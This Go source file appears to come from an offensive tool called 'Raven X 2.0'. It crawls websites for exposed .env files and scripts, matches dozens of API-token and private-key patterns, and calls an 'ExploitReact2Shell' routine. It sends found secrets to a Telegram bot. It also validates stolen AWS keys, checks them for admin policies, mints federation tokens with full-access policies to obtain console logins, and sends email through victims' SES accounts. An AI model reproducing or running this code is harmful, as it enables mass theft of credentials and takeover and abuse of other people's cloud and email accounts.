		MailjetSMTPPattern:      regexp.MustCompile(`in-v3\.mailjet\.com`),
		MailgunSMTPPattern:      regexp.MustCompile(`smtp\.mailgun\.org`),
		MailgunEUSMTPPattern:    regexp.MustCompile(`smtp\.eu\.mailgun\.org`),
		ZeptoMailSMTPPattern:    regexp.MustCompile(`smtp\.zeptomail\.com`),
		GmailSMTPPattern:        regexp.MustCompile(`smtp(?:-relay)?\.gmail\.com`),
		MandrillSMTPPattern:     regexp.MustCompile(`smtp\.mandrillapp\.com`),
		Office365SMTPPattern:    regexp.MustCompile(`smtp\.office365\.com`),
		BrevoSMTPPattern:        regexp.MustCompile(`smtp\-relay\.brevo\.com`),
		ElasticEmailSMTPPattern: regexp.MustCompile(`smtp\.elasticemail\.com`),
		SendinBlueSMTPPattern:   regexp.MustCompile(`smtp\-relay\.sendinblue\.com`),
		KagoyaSMTPPattern: regexp.MustCompile(`smtp\.kagoya\.net`),

		// Wave-6 patterns
		// GitHub personal access tokens — new format (ghp_/gho_/ghs_/ghr_),
		// fine-grained PATs (github_pat_), and legacy 40-char hex.
		GitHubTokenPattern: regexp.MustCompile(`(?:ghp_[A-Za-z0-9_]{36}|gho_[A-Za-z0-9_]{36}|ghu_[A-Za-z0-9_]{36}|ghs_[A-Za-z0-9._-]{36,600}|ghr_[A-Za-z0-9_]{76}|github_pat_[A-Za-z0-9]{22}_[A-Za-z0-9]{59})`),
		// GCP / Google API key: AIza prefix + 35 Base64url chars
		GCPAPIKeyPattern: regexp.MustCompile(`AIza[0-9A-Za-z\-_]{35}`),
		// Ethereum private key: optional 0x prefix + exactly 64 lowercase hex chars
		CryptoWalletPattern: regexp.MustCompile(`\b(?:0x)?[0-9a-fA-F]{64}\b`),

		// Wave-7 patterns
		// Slack bot tokens: xoxb- prefix
		SlackBotTokenPattern: regexp.MustCompile(`xoxb-[0-9]{10,13}-[0-9]{10,13}-[A-Za-z0-9]{24,32}`),
		// Discord bot tokens: MFA- or NNN. format
		DiscordBotTokenPattern: regexp.MustCompile(`[MN][A-Za-z0-9]{23,25}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,38}`),
		// Cloudflare API tokens: 40-char base64url with context keyword
		CloudflareTokenPattern: regexp.MustCompile(`(?i)(?:CLOUDFLARE_API_TOKEN|CF_API_TOKEN|cloudflare[_\-]?(?:api[_\-]?)?(?:token|key))\s*[:=]\s*["']?([A-Za-z0-9_-]{40})["']?`),
		// DigitalOcean personal access tokens: dop_v1_ prefix + 64 hex chars
		DigitalOceanTokenPattern: regexp.MustCompile(`dop_v1_[a-f0-9]{64}`),
		// Shopify access tokens: shppa_, shpca_, shpat_ prefixes
		ShopifyTokenPattern: regexp.MustCompile(`shp(?:pa|ca|at)_[a-f0-9]{32}`),
		// HubSpot: private app token (pat-) or API key UUID with context
		HubSpotTokenPattern: regexp.MustCompile(`(?:pat-[a-z]{2}\d+-[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}|(?i)(?:HUBSPOT_API_KEY|hubspot[_\-]?(?:api[_\-]?)?key)\s*[:=]\s*["']?([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["']?)`),
		// Heroku: UUID-format API key with context keyword
		HerokuAPIKeyPattern: regexp.MustCompile(`(?i)(?:HEROKU_API_KEY|heroku[_\-]?(?:api[_\-]?)?(?:key|token))\s*[:=]\s*["']?([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["']?`),
		// Datadog: 32-char hex API key with context keyword
		DatadogAPIKeyPattern: regexp.MustCompile(`(?i)(?:DD_API_KEY|DATADOG_API_KEY|datadog[_\-]?(?:api[_\-]?)?key)\s*[:=]\s*["']?([a-f0-9]{32})["']?`),

		// SSH private key — matches RSA/DSA/EC/OpenSSH PEM blocks
		SSHPrivateKeyPattern: regexp.MustCompile(`-----BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----[A-Za-z0-9+/=\r\n]{50,}-----END (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----`),

		// npm auth token — //registry.example.com/:_authToken=<token>
		NPMAuthTokenPattern: regexp.MustCompile(`//[a-zA-Z0-9._/-]+:_authToken=([A-Za-z0-9._-]{20,})`),

		// ── Wave-9: Extended AI provider patterns ──────────────────────────────
		GeminiAPIKeyPattern:      geminiAPIKeyPattern,
		XAIAPIKeyPattern:         xaiAPIKeyPattern,
		MistralAPIKeyPattern:     mistralAPIKeyPattern,
		ElevenLabsAPIKeyPattern:  elevenlabsAPIKeyPattern,
		GroqAPIKeyPattern:        groqAPIKeyPattern,
		PerplexityAPIKeyPattern:  perplexityAPIKeyPattern,
		OpenRouterAPIKeyPattern:  openrouterAPIKeyPattern,
		HuggingFaceAPIKeyPattern: huggingfaceAPIKeyPattern,
		ReplicateAPIKeyPattern:   replicateAPIKeyPattern,
		CohereAPIKeyPattern:      cohereAPIKeyPattern,
		TogetherAIAPIKeyPattern:  togetherAIAPIKeyPattern,
		FireworksAPIKeyPattern:   fireworksAPIKeyPattern,

		// ── Wave-9: Extended email provider patterns ───────────────────────────
		MailchimpAPIKeyPattern: mailchimpAPIKeyPattern,
		ResendAPIKeyPattern:    resendAPIKeyPattern,

		// ── Wave-10: Git hosting platform patterns ─────────────────────────────
		GitLabTokenPattern:          gitlabPattern,
		BitbucketAppPasswordPattern: bitbucketAppPasswordPattern,
		BitbucketContextPattern:     bitbucketContextPattern,

		ValidKeyLimits: sync.Map{},
		KnownKeys:          sync.Map{},
		SentTelegrams:      sync.Map{},
		VisitedURLs:        sync.Map{},
		TempDir:            tempDir,
	}
}

func (e *Enhancer) EnhanceScanner(a *AWSScanner) {
}

func (e *Enhancer) CrawlAndExtract(startURL string, maxDepth int, a *AWSScanner) {
	visited := make(map[string]struct{})
	queue := []struct {
		url   string
		depth int
	}{{startURL, 0}}

	for len(queue) > 0 {
		item := queue[0]
		queue = queue[1:]
		if item.depth > maxDepth {
			continue
		}
		if _, ok := visited[item.url]; ok {
			continue
		}
		visited[item.url] = struct{}{}

		body, headers, err := e.fetchURL(item.url)
		if err != nil {
			if err.Error() != "not-http" {
				globalCounters.mu.Lock()
				globalCounters.URLsFailed++
				globalCounters.mu.Unlock()
			}
			continue
		}

		e.scanHeaders(headers, item.url, a)

		a.checkAndSaveKeys(body, item.url)

		params := e.extractParamsFromURL(item.url)
		for _, p := range params {
			a.checkAndSaveKeys(p, item.url)
		}

		// Run exploit functions untuk ekstraksi credentials (tanpa goroutine terpisah untuk menghindari ledakan)
		// Exploit functions sudah cukup cepat dan tidak perlu parallelization tambahan
		if a.Config.ExploitMethods.React2Shell {
			a.ExploitReact2Shell(item.url, item.url)
		}

		scripts := e.extractScriptSrc(body, item.url)
		for _, s := range scripts {
			jsBody, _, err := e.fetchURL(s)
			if err == nil {
				a.checkAndSaveKeys(jsBody, s)
				if decoded := e.tryUnpackJS(jsBody); decoded != "" {
					a.checkAndSaveKeys(decoded, s+" (unpack)")
				}
			}
			if item.depth+1 <= maxDepth && e.isSameHost(startURL, s) {
				queue = append(queue, struct {
					url   string
					depth int
				}{s, item.depth + 1})
			}
		}

		if item.depth == 0 {
			sm, _ := e.fetchSitemap(startURL)
			for _, u := range sm {
				if _, ok := visited[u]; !ok {
					if item.depth+1 <= maxDepth {
						queue = append(queue, struct {
							url   string
							depth int
						}{u, 1})
					}
				}
			}
		}

		links := e.extractLinksFromHTML(body, item.url)
		for _, l := range links {
			if _, ok := visited[l]; ok {
				continue
			}
			if item.depth+1 <= maxDepth && e.isSameHost(startURL, l) {
				queue = append(queue, struct {
					url   string
					depth int
				}{l, item.depth + 1})
			}
		}

	}
}

func (e *Enhancer) fetchURL(rawurl string) (string, map[string][]string, error) {
	if !strings.HasPrefix(rawurl, "http") {
		return "", nil, errors.New("not-http")
	}
	req, err := http.NewRequest("GET", rawurl, nil)
	if err != nil {
		return "", nil, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; RavenX-Enhancer/1.0)")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := e.client.Do(req.WithContext(ctx))
	if err != nil {
		return "", nil, err
	}
	defer resp.Body.Close()

	// Batasi response body untuk mencegah OOM
	b, err := ioutil.ReadAll(io.LimitReader(resp.Body, 128*1024)) // 512KB max
	if err != nil {
		return "", nil, err
	}

	return string(b), resp.Header, nil
}

func (e *Enhancer) scanHeaders(h map[string][]string, source string, a *AWSScanner) {
	for k, vals := range h {
		for _, v := range vals {
			if strings.Contains(strings.ToLower(k), "x-api") || strings.Contains(strings.ToLower(k), "authorization") || strings.Contains(strings.ToLower(k), "x-amz") {
				a.checkAndSaveKeys(v, source+" (header:"+k+")")
			}
			if e.base64Candidate.MatchString(v) {
				if dec := tryDecodeBase64(v); dec != "" {
					a.checkAndSaveKeys(dec, source+" (header-decoded)")
				}
			}
		}
	}
}

func (e *Enhancer) extractParamsFromURL(raw string) []string {
	vals := []string{}
	u, err := url.Parse(raw)
	if err != nil {
		matches := e.urlParamPattern.FindAllStringSubmatch(raw, -1)
		for _, m := range matches {
			if len(m) > 2 {
				v, _ := url.QueryUnescape(m[2])
				vals = append(vals, v)
			}
		}
		return vals
	}
	for _, vs := range u.Query() {
		for _, v := range vs {
			if len(v) >= 8 {
				vals = append(vals, v)
			}
		}
	}
	return vals
}

func (e *Enhancer) extractScriptSrc(htmlBody string, base string) []string {
	out := []string{}
	matches := e.scriptSrcPattern.FindAllStringSubmatch(htmlBody, -1)
	for _, m := range matches {
		if len(m) > 1 {
			src := strings.TrimSpace(m[1])
			if src == "" {
				continue
			}
			if strings.HasPrefix(src, "//") {
				src = "https:" + src
			}
			if strings.HasPrefix(src, "/") {
				if u, err := url.Parse(base); err == nil {
					src = u.Scheme + "://" + u.Host + src
				}
			}
			out = append(out, src)
		}
	}
	return unique(out)
}

func (e *Enhancer) tryUnpackJS(js string) string {
	if m := e.evalAtobPattern.FindStringSubmatch(js); len(m) > 1 {
		cand := m[1]
		switch len(cand) % 4 {
		case 2:
			cand += "=="
		case 3:
			cand += "="
		}
		if b, err := base64.StdEncoding.DecodeString(cand); err == nil {
			if isPrintableText(b) {
				return string(b)
			}
		}
	}

	if m := e.evalUnescapePatt.FindString(js); m != "" {
		unescaped := strings.TrimPrefix(m, "eval(unescape(\"")
		unescaped = strings.TrimSuffix(unescaped, "\"))")
		unescaped = strings.TrimPrefix(unescaped, "eval(unescape('")
		unescaped = strings.TrimSuffix(unescaped, "'))")

		unq, err := url.QueryUnescape(unescaped)
		_ = err
		if unq != "" {
			return unq
		}
	}

	if m := e.base64Candidate.FindString(js); m != "" {
		if dec := tryDecodeBase64(m); dec != "" {
			return dec
		}
	}

	return ""
}

func (e *Enhancer) fetchSitemap(baseRaw string) ([]string, error) {
	u, err := url.Parse(baseRaw)
	if err != nil {
		return nil, err
	}
	roots := []string{
		fmt.Sprintf("%s://%s/sitemap.xml", u.Scheme, u.Host),
		fmt.Sprintf("%s://%s/sitemap_index.xml", u.Scheme, u.Host),
	}
	res := []string{}
	for _, s := range roots {
		body, _, err := e.fetchURL(s)
		if err != nil {
			continue
		}
		matches := e.sitemapPattern.FindAllStringSubmatch(body, -1)
		for _, m := range matches {
			if len(m) > 1 {
				res = append(res, strings.TrimSpace(m[1]))
			}
		}
		if len(res) > 0 {
			return unique(res), nil
		}
	}
	return res, errors.New("no sitemap")
}

func (e *Enhancer) extractLinksFromHTML(body, base string) []string {
	hrefP := regexp.MustCompile(`(?i)href=["']([^"'#]+)["']`)
	outs := []string{}
	matches := hrefP.FindAllStringSubmatch(body, -1)
	for _, m := range matches {
		if len(m) > 1 {
			link := strings.TrimSpace(m[1])
			if strings.HasPrefix(link, "javascript:") || strings.HasPrefix(link, "mailto:") {
				continue
			}
			if strings.HasPrefix(link, "/") {
				if u, err := url.Parse(base); err == nil {
					link = u.Scheme + "://" + u.Host + link
				}
			}
			if strings.HasPrefix(link, "http") {
				outs = append(outs, link)
			}
		}
	}
	return unique(outs)
}

func (e *Enhancer) isSameHost(a, b string) bool {
	u1, err1 := url.Parse(a)
	u2, err2 := url.Parse(b)
	if err1 != nil || err2 != nil {
		return false
	}
	return strings.EqualFold(u1.Hostname(), u2.Hostname())
}

func extractValueFromPhpInfoTable(htmlContent, settingName string) string {
	regexString := fmt.Sprintf(`(?is)<td\s+class="e">.*?%s.*?</td>\s*<td\s+class="v">(.*?)</td>`, regexp.QuoteMeta(settingName))
	re := regexp.MustCompile(regexString)
	match := re.FindStringSubmatch(htmlContent)
	if len(match) > 1 {
		val := strings.TrimSpace(match[1])
		val = strings.ReplaceAll(val, "&nbsp;", " ")
		val = strings.ReplaceAll(val, "&quot;", "\"")
		val = strings.Trim(val, "\"'")
		return val
	}
	return ""
}

func randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[int(time.Now().UnixNano())%len(charset)]
	}
	return string(b)
}

func GenerateRandomEmail() string {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 10)
	for i := range b {
		b[i] = charset[int(time.Now().UnixNano())%len(charset)]
	}
	return fmt.Sprintf("%s@%s.com", string(b), "randomtestdomain")
}

func IsIgnoredExt(ext string) bool {
	ignored := []string{".jpg", ".jpeg", ".png", ".gif", ".exe", ".zip", ".pdf", ".css", ".html", ".svg", ".woff", ".woff2", ".mp4", ".mp3", ".json", ".lock"}
	for _, i := range ignored {
		if strings.EqualFold(ext, i) {
			return true
		}
	}
	return false
}

func unique(input []string) []string {
	m := make(map[string]struct{})
	var out []string
	for _, s := range input {
		if _, ok := m[s]; !ok {
			m[s] = struct{}{}
			out = append(out, s)
		}
	}
	return out
}

func resolveURL(base, ref string) string {
	u, err := url.Parse(ref)
	if err != nil {
		return ref
	}
	if u.IsAbs() {
		return ref
	}
	baseURL, err := url.Parse(base)
	if err != nil {
		return ref
	}
	return baseURL.ResolveReference(u).String()
}

func loadEnvPaths() []string {
	// If paths.txt exists alongside main.go, read it line-by-line and prefer those
	// paths over the built-in list. Lines starting with # are ignored.
	if data, err := os.ReadFile("paths.txt"); err == nil {
		var lines []string
		for _, ln := range strings.Split(string(data), "\n") {
			ln = strings.TrimSpace(ln)
			if ln == "" || strings.HasPrefix(ln, "#") {
				continue
			}
			lines = append(lines, ln)
		}
		if len(lines) > 0 {
			return lines
		}
	}

	return []string{
		"/.env",
		"/api/.env",
		"/app/.env",
		"/system/.env",
		"/laravel/.env",
		"/core/.env",
		"/vendor/.env",
		"/storage/.env",
		"/public/.env",
		"/dev/.env",
		"/api/v1/.env",
		"/api/v2/.env",
		"/admin/.env",
		"/.environment",
		"/api/.environment",
		"/app/.environment",
		"/.env.dist",
		"/.env.local.php",
		"/config/.env",
		"/config/env",
		"/config/environment",
		"/app/config/.env",
		"/apps/.env",
		"/apps/config/.env",
		"/backend/.env",
		"/client/.env",
		"/clients/.env",
		"/customer/.env",
		"/customers/.env",
		"/admin/config/.env",
		"/administrator/.env",
		"/wp/.env",
		"/wordpress/.env",
		"/cms/.env",
		"/database/.env",
		"/db/.env",
		"/upload/.env",
		"/uploads/.env",
		"/backup/.env",
		"/backups/.env",
		"/.backup/.env",
		"/backup/env",
		"/old/.env",
		"/new/.env",
		"/2020/.env",
		"/2021/.env",
		"/2022/.env",
		"/2023/.env",
		"/2024/.env",
		"/v1/.env",
		"/v2/.env",
		"/v3/.env",
		"/api/config/.env",
		"/api/core/.env",
		"/api/app/.env",
		"/api/test/.env",
		"/api/dev/.env",
		"/api/beta/.env",
		"/beta/.env",
		"/prod/.env",
		"/production/.env",
		"/stage/.env",
		"/staging/.env",
		"/test/.env",
		"/testing/.env",
		"/development/.env",
		"/develop/.env",
		"/docker/.env",
		"/docker-compose/.env",
		"/.docker/.env",
		"/src/.env",
		"/source/.env",
		"/sources/.env",
		"/root/.env",
		"/home/.env",
		"/site/.env",
		"/panel/.env",
		"/control/.env",
		"/console/.env",
		"/admin/console/.env",
		"/administrator/config/.env",
		"/webadmin/.env",
		"/sysadmin/.env",
		"/mysql/.env",
		"/dbadmin/.env",
		"/sql/.env",
		"/master/.env",
		"/temp/.env",
		"/tmp/.env",
		"/cloud/.env",
		"/cgi-bin/.env",
		"/blog/.env",
		"/blogs/.env",
		"/engine/.env",
		"/forum/.env",
		"/forums/.env",
		"/store/.env",
		"/shop/.env",
		"/cart/.env",
		// Named environment variants (common in Node/Laravel/Next.js projects)
		"/.env.local",
		"/.env.development",
		"/.env.production",
		"/.env.testing",
		"/.env.staging",
		"/api/.env.local",
		"/api/.env.production",
		"/app/.env.local",
		"/app/.env.production",
		"/config/app.env",
		// High-value paths from real-world hit leaderboard data
		"/%2eenv",           // URL-encoded /.env — 3K+ real hits
		"/%2F.env",          // double-slash encoded
		"/%2f.env",
		"/rest/.env",        // /rest prefix — top 3 by hit volume
		"/rest/.environment",
		"/rest/config.json",
		"/s3/.env",          // /s3 prefix
		"/s3/config.json",
		"/.well-known/.env",
		"/.well-known/security.txt",
		"/_react/.env",      // React app config paths
		"/_react/config.js",
		"/_react/config.json",
		"/oauth/.env",
		"/webhook/.env",
		"/v1/.env",
		"/v1/config.json",
		"/v2/.env",
		"/v2/config.json",
		"/.aws/credentials", // AWS credentials directory (already in another block, ensure present)
		"/~/.env",           // home directory expansion
		"/~/config/.env",
		"/$(pwd)/.env",      // path injection variant — 35K hits
	}
}

func (a *AWSScanner) saveIntoFile(line, filename string) {
	os.MkdirAll("ResultJS", 0755)
	f, err := os.OpenFile(filepath.Join("ResultJS", filename), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	f.WriteString(line + "\n")
}

func (a *AWSScanner) sendTelegram(message string) {
	if a.Config.Telegram.BotToken == "" || a.Config.Telegram.ChatID == "" {
		return
	}

	// Generate unique hash dari message untuk tracking
	// Extract key portion dari message untuk uniqueness
	messageHash := a.generateTelegramHash(message)

	// Cek apakah message sudah pernah dikirim
	if _, loaded := a.SentTelegrams.LoadOrStore(messageHash, true); loaded {
		pterm.Debug.Printfln("[TELEGRAM SKIP] Duplicate message prevented: %s", messageHash[:16]+"...")
		return
	}

	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", a.Config.Telegram.BotToken)
	data := url.Values{}
	data.Set("chat_id", a.Config.Telegram.ChatID)
	data.Set("text", message)
	data.Set("parse_mode", "HTML")
	http.PostForm(apiURL, data)

	pterm.Debug.Printfln("[TELEGRAM SENT] Message hash: %s", messageHash[:16]+"...")
}

// generateTelegramHash membuat unique hash dari message untuk deduplication
func (a *AWSScanner) generateTelegramHash(message string) string {
	// Extract key portions yang membuat message unique
	// Biasanya berupa credential values di dalam <code> tags

	codePattern := regexp.MustCompile(`<code>([^<]+)</code>`)
	matches := codePattern.FindAllStringSubmatch(message, -1)

	var keyParts []string
	for _, match := range matches {
		if len(match) > 1 {
			value := strings.TrimSpace(match[1])
			// Skip values yang terlalu pendek (< 4 chars) atau generic text
			if len(value) >= 4 && !strings.HasPrefix(value, "http") {
				keyParts = append(keyParts, value)
			}
		}
	}

	// Jika tidak ada <code> tags yang valid, extract type dari message
	if len(keyParts) == 0 {
		// Extract message type sebagai fallback
		typePattern := regexp.MustCompile(`<b>([A-Z\s]+(?:KEY|TOKEN|ACCOUNT|CRACKED))</b>`)
		if typeMatch := typePattern.FindStringSubmatch(message); len(typeMatch) > 1 {
			// Gunakan type + first 200 chars sebagai unique ID
			if len(message) > 200 {
				return typeMatch[1] + "|" + message[:200]
			}
			return typeMatch[1] + "|" + message
		}
		// Last resort: gunakan first 300 chars dari message
		if len(message) > 300 {
			return message[:300]
		}
		return message
	}

	// Gabungkan semua key parts sebagai unique identifier
	// Sort untuk konsistensi (case insensitive comparison)
	uniqueID := strings.Join(keyParts, "|")
	return strings.ToLower(uniqueID)
}

func (a *AWSScanner) alreadySent(ak, sk string) bool {
	path := filepath.Join("ResultJS", "aws_valid.txt")
	b, err := ioutil.ReadFile(path)
	if err != nil {
		if os.IsNotExist(err) {
			return false
		}
		return false
	}
	return strings.Contains(string(b), fmt.Sprintf("%s:%s", ak, sk))
}

func (a *AWSScanner) logFound(name, key, source string) {
	pterm.Warning.Printfln("[FOUND] %s: %s | Source: %s", name, key, source)
}

func (a *AWSScanner) logValid(name, details string) {
	pterm.Success.Printfln("[VALID] %s: %s", name, details)
}

func (a *AWSScanner) storeValidKeyLimit(keyType string, key string, limit interface{}) {
	if limit == nil {
		return
	}
	globalCounters.mu.Lock()
	defer globalCounters.mu.Unlock()
	keyPrefix := key
	if len(key) > 40 {
		keyPrefix = key[:40]
	}
	maskedKey := keyPrefix
	if len(maskedKey) > 10 {
		maskedKey = maskedKey[:4] + "..." + maskedKey[len(maskedKey)-4:]
	} else if len(maskedKey) > 4 {
		maskedKey = maskedKey[:4] + "..."
	}
	mapKey := fmt.Sprintf("%s:%s", keyType, maskedKey)
	a.ValidKeyLimits.Store(mapKey, fmt.Sprintf("%v", limit))
}

func getAllRegions(service string) ([]string, error) {
	return []string{
		"us-east-1", "us-east-2", "us-west-1", "us-west-2",
		"af-south-1", "ap-east-1", "ap-south-1", "ap-northeast-1", "ap-northeast-2", "ap-northeast-3",
		"ap-southeast-1", "ap-southeast-2", "ap-southeast-3", "ca-central-1",
		"eu-central-1", "eu-west-1", "eu-west-2", "eu-west-3", "eu-north-1", "eu-south-1", "eu-south-2", "eu-central-2",
		"me-south-1", "me-central-1", "sa-east-1",
	}, nil
}

func (a *AWSScanner) checkS3Access(cfg aws.Config) string {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	s3Client := s3.NewFromConfig(cfg)

	output, err := s3Client.ListBuckets(ctx, &s3.ListBucketsInput{})

	if err == nil && output != nil {
		count := len(output.Buckets)
		if count > 0 {
			return fmt.Sprintf("✅ S3 List: %d Buckets Found", count)
		}
		return "✅ S3 List: Permitted (0 Buckets)"
	}

	return "❌ S3 List: Denied or Error"
}

func (a *AWSScanner) auditIAMUser(cfg aws.Config, username string) string {
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	iamClient := iam.NewFromConfig(cfg)
	var riskReport []string

	inlinePols, err := iamClient.ListUserPolicies(ctx, &iam.ListUserPoliciesInput{UserName: aws.String(username)})
	if err == nil {
		riskReport = append(riskReport, fmt.Sprintf("Inline Policies: %v", inlinePols.PolicyNames))
		for _, pname := range inlinePols.PolicyNames {
			if strings.Contains(strings.ToLower(pname), "admin") {
				riskReport = append(riskReport, "⚠️ CRITICAL: Potential Admin Inline Policy Detected")
			}
		}
	}

	attachedPols, err := iamClient.ListAttachedUserPolicies(ctx, &iam.ListAttachedUserPoliciesInput{UserName: aws.String(username)})
	if err == nil {
		var polNames []string
		for _, p := range attachedPols.AttachedPolicies {
			polNames = append(polNames, *p.PolicyName)
			if *p.PolicyName == "AdministratorAccess" {
				riskReport = append(riskReport, "🚨 CRITICAL: AdministratorAccess Attached!")
			}
		}
		riskReport = append(riskReport, fmt.Sprintf("Managed Policies: %v", polNames))
	}

	if len(riskReport) == 0 {
		return "No explicit policies found (likely implicit or group based)"
	}
	return strings.Join(riskReport, " | ")
}

func (a *AWSScanner) validateAWSCredentials(accessKey, secretKey, sessionToken string) (bool, *sts.GetCallerIdentityOutput, aws.Config, string) {
	ctx := context.Background()

	cfg, err := config.LoadDefaultConfig(ctx,
		config.WithRegion(a.DefaultRegion),
		config.WithCredentialsProvider(credentials.NewStaticCredentialsProvider(accessKey, secretKey, sessionToken)),
	)
	if err != nil {
		return false, nil, aws.Config{}, ""
	}

	stsClient := sts.NewFromConfig(cfg)
	identity, err := stsClient.GetCallerIdentity(ctx, &sts.GetCallerIdentityInput{})

	if err != nil {
		return false, nil, aws.Config{}, ""
	}

	s3Status := a.checkS3Access(cfg)

	return true, identity, cfg, s3Status
}

func (a *AWSScanner) getFederationConsoleURL(cfg aws.Config, identity *sts.GetCallerIdentityOutput, durationSeconds int32) map[string]string {
	if !a.Config.AWSChecks.FederationConsoleURL { // Menggunakan flag baru
		return nil
	}
	ctx := context.Background()
	stsClient := sts.NewFromConfig(cfg)

	sessionName := "FederatedUser" + randomString(6)
	policy := map[string]interface{}{
		"Version":   "2012-10-17",
		"Statement": []map[string]interface{}{{"Effect": "Allow", "Action": "*", "Resource": "*"}},
	}
	policyBytes, _ := json.Marshal(policy)

	getToken, err := stsClient.GetFederationToken(ctx, &sts.GetFederationTokenInput{
		Name:            aws.String(sessionName),
		Policy:          aws.String(string(policyBytes)),
		DurationSeconds: aws.Int32(durationSeconds),
	})
	if err != nil {
		return nil
	}

	creds := getToken.Credentials
	sessionJson, _ := json.Marshal(map[string]string{
		"sessionId":    *creds.AccessKeyId,
		"sessionKey":   *creds.SecretAccessKey,
		"sessionToken": *creds.SessionToken,
	})

	signinURL := "https://signin.aws.amazon.com/federation"
	getTokenURL := fmt.Sprintf("%s?Action=getSigninToken&Session=%s", signinURL, url.QueryEscape(string(sessionJson)))

	resp, err := http.Get(getTokenURL)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	var tokenResp struct {
		SigninToken string `json:"SigninToken"`
	}
	json.Unmarshal(body, &tokenResp)

	destination := "https://console.aws.amazon.com/"
	finalURL := fmt.Sprintf("%s?Action=login&Issuer=aws_scanner&Destination=%s&SigninToken=%s",
		signinURL, url.QueryEscape(destination), url.QueryEscape(tokenResp.SigninToken))

	return map[string]string{
		"federation_console_url": finalURL,
		"session_name":           sessionName,
		"expires_at":             creds.Expiration.Format(time.RFC3339),
		"arn":                    *identity.Arn,
	}
}

func (a *AWSScanner) checkSESDetailsAllRegions(cfg aws.Config) map[string]map[string]interface{} {
	if !a.Config.AWSChecks.SESQuotaCheck { // Menggunakan flag baru
		return map[string]map[string]interface{}{}
	}
	ctx := context.Background()
	regions, _ := getAllRegions("ses")
	results := make(map[string]map[string]interface{})

	ctx, cancel := context.WithTimeout(ctx, 45*time.Second)
	defer cancel()

	for _, region := range regions {
		cfg.Region = region
		sesClient := ses.NewFromConfig(cfg)
		sesv2Client := sesv2.NewFromConfig(cfg)
		quota, err := sesClient.GetSendQuota(ctx, &ses.GetSendQuotaInput{})
		if err != nil {
			continue
		}

		account, err := sesv2Client.GetAccount(ctx, &sesv2.GetAccountInput{})
		health := "Unknown"
		if err == nil && account != nil && account.EnforcementStatus != nil {
			health = *account.EnforcementStatus
		}

		// Get email identities
		identities := []string{}
		identitiesResp, err := sesv2Client.ListEmailIdentities(ctx, &sesv2.ListEmailIdentitiesInput{})
		if err == nil && identitiesResp != nil {
			for _, identity := range identitiesResp.EmailIdentities {
				if identity.IdentityName != nil {
					identities = append(identities, *identity.IdentityName)
				}
			}
		}

		if quota.Max24HourSend > 0 {
			results[region] = map[string]interface{}{
				"SendQuota":    quota.Max24HourSend,
				"LastSend":     quota.SentLast24Hours,
				"MaxSendRate":  quota.MaxSendRate,
				"HealthStatus": health,
				"Identities":   identities,
			}
		}
	}
	return results
}

// SendEmailViaAWS mengirim email menggunakan AWS SES
func (a *AWSScanner) SendEmailViaAWS(cfg aws.Config, accessKey, secretKey, sourceURL string) map[string]interface{} {
	result := make(map[string]interface{})
	result["success"] = false
	result["error"] = ""
	result["from_email"] = ""
	result["region"] = ""
	result["quota_limit"] = 0.0
	result["quota_remaining"] = 0.0
	result["identities"] = []string{}

	if a.Config.EmailTarget == "" {
		result["error"] = "Email target not configured"
		return result
	}

	ctx := context.Background()
	regions, _ := getAllRegions("ses")

	for _, region := range regions {
		cfg.Region = region
		sesv2Client := sesv2.NewFromConfig(cfg)

		// List email identities untuk region ini
		identitiesResp, err := sesv2Client.ListEmailIdentities(ctx, &sesv2.ListEmailIdentitiesInput{})
		if err != nil || identitiesResp == nil || len(identitiesResp.EmailIdentities) == 0 {
			continue
		}

		// Ambil email identity pertama yang tersedia
		var fromEmail string
		for _, identity := range identitiesResp.EmailIdentities {
			if identity.IdentityName != nil {
				fromEmail = *identity.IdentityName
				break
			}
		}

		if fromEmail == "" {
			continue
		}

		// Get quota info
		sesClient := ses.NewFromConfig(cfg)
		quota, err := sesClient.GetSendQuota(ctx, &ses.GetSendQuotaInput{})
		if err != nil {
			continue
		}

		// Coba kirim email
		subject := "Raven X 2.0 - Credential Test"
		body := fmt.Sprintf(`This is a test email from Raven X 2.0 Scanner.

Credentials found at: %s
Access Key: %s
Secret Key: %s

This email confirms that the AWS SES credentials are working.`, sourceURL, accessKey, secretKey)

		emailContent := &types.EmailContent{
			Simple: &types.Message{
				Subject: &types.Content{
					Data:    aws.String(subject),
					Charset: aws.String("UTF-8"),
				},
				Body: &types.Body{
					Text: &types.Content{
						Data:    aws.String(body),
						Charset: aws.String("UTF-8"),
					},
				},
			},
		}

		destination := &types.Destination{
			ToAddresses: []string{a.Config.EmailTarget},
		}

		sendEmailInput := &sesv2.SendEmailInput{
			FromEmailAddress: aws.String(fromEmail),
			Destination:      destination,
			Content:          emailContent,
		}

		_, err = sesv2Client.SendEmail(ctx, sendEmailInput)
		if err == nil {
			result["success"] = true
			result["from_email"] = fromEmail
			result["region"] = region
			result["quota_limit"] = quota.Max24HourSend
			result["quota_remaining"] = quota.Max24HourSend - quota.SentLast24Hours

			identities := []string{}
			for _, identity := range identitiesResp.EmailIdentities {
				if identity.IdentityName != nil {
					identities = append(identities, *identity.IdentityName)
				}
			}
			result["identities"] = identities
			return result
		}
	}

	result["error"] = "Failed to send email from any region with identities"
	return result
}

